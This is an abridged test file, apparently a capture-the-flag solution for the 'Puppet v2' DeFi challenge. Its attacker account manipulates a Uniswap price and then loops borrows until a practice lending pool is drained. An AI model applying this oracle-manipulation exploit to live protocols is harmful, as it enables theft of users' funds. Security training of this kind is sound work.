...
describe("[Challenge] Puppet v2", function () {
	...
	it("Exploit", async function () {
		...
		let i = 2;
		while (!(await this.token.balanceOf(this.lendingPool.address)).eq(0)) {
			let amountIn = await this.token.balanceOf(attacker.address);

			await this.token.connect(attacker).approve(this.uniswapRouter.address, amountIn);
			...
			console.log(
				"WETH of attacker: " + (await this.weth.balanceOf(attacker.address)).toString()
			);
			console.log(
				"Deposit of WETH required for initial token balance lending: " +
					(
			...
			let borrowAmount = await this.lendingPool.calculateAmountOfTokenToBorrow(
				wethBalance
			);
			let lendingPoolBalance = await this.token.balanceOf(this.lendingPool.address);
			console.log("Amount of tokens to borrow:  " + borrowAmount.toString());
			console.log(
				"weth amount required: " +
					(await this.lendingPool.calculateDepositOfWETHRequired(borrowAmount)).toString()
			);

			if (borrowAmount.gt(lendingPoolBalance)) {
				await this.weth
					.connect(attacker)
					.approve(this.lendingPool.address, lendingPoolBalance);

				await this.lendingPool.connect(attacker).borrow(lendingPoolBalance);
			} else {
				await this.weth.connect(attacker).approve(this.lendingPool.address, borrowAmount);
		...
		await this.weth.connect(attacker).approve(this.uniswapRouter.address, wethAmount);
		await this.uniswapRouter
			.connect(attacker)
			.swapExactTokensForTokens(
				wethAmount,
